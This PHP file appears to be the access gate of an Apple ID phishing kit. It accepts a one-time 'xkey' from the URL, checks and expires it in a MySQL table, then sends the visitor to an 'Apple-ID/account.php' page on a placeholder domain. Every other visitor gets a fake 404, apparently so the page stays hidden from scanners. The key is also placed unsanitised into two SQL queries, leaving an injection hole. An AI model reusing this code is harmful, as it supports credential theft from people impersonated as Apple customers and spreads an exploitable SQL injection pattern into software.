<?php @error_reporting(0);
session_start();    

$_SESSION["logged"] = false;
define('Secure', TRUE);


if (isset($_GET['xkey'])) {
    $xkey = $_GET['xkey'];
    $mysql = NEW MySQLi('host', 'username','password','database name');
    $result = $mysql->query("SELECT expired,xkey FROM links WHERE expired = 0  AND xkey = '$xkey' LIMIT 1");
    if ($result->num_rows == 1) {
        $update = $mysql->query("UPDATE links SET expired = 1 WHERE xkey = '$xkey' LIMIT 1");
        if ($update) {
            $_SESSION["logged"] = true;
            header("Location: https://yourdomaine.com/Apple-ID/account.php");
            exit();
        } else {
            header("HTTP/1.0 404 Not Found");
        }
    }else {
        header("HTTP/1.0 404 Not Found");
    }
}else {
    header("HTTP/1.0 404 Not Found");
}

?>